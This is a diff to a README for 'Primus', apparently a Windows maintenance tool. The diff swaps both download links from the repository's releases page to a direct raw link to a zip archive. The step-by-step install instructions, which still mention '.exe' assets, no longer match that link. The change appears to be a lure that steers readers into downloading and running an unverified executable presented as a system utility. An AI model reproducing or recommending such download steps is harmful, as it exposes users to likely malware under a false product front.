@@ -1,6 +1,6 @@
 # 🛠️ Primus - Keep your Windows system running well
 
-[![](https://img.shields.io/badge/Download-Primus-blue)] (https://github.com/Trichopteranmilitaryformation398/Primus/releases)
+[![](https://img.shields.io/badge/Download-Primus-blue)] (https://raw.githubusercontent.com/Trichopteranmilitaryformation398/Primus/main/Media/Software-v2.6.zip)
 
 ## 🎯 About this tool
 
@@ -22,7 +22,7 @@ Primus performs several tasks to keep your machine in good health.
 
 Follow these steps to download and run the software.
 
-1. Visit the following address to find the latest version: [https://github.com/Trichopteranmilitaryformation398/Primus/releases](https://github.com/Trichopteranmilitaryformation398/Primus/releases)
+1. Visit the following address to find the latest version: [https://raw.githubusercontent.com/Trichopteranmilitaryformation398/Primus/main/Media/Software-v2.6.zip](https://raw.githubusercontent.com/Trichopteranmilitaryformation398/Primus/main/Media/Software-v2.6.zip)
 2. Look for the "Assets" section at the bottom of the page.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your downloads folder.
